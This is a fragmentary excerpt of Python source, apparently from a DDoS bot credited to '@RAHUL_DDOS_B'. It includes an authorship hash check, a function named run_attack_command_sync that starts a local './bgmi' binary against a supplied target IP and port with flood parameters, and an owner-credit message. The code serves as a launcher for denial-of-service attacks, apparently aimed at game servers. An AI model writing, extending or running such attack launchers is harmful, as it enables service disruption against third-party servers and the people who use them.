...
def verify():
    ...
    if computed_hash != stored_hash:
        raise Exception("This File Is Made By @RAHUL_DDOS_B.")
    print("This File Is Made By @RAHUL_DDOS_B.")
...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "800", "800"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @RAHUL_DDOS_B"
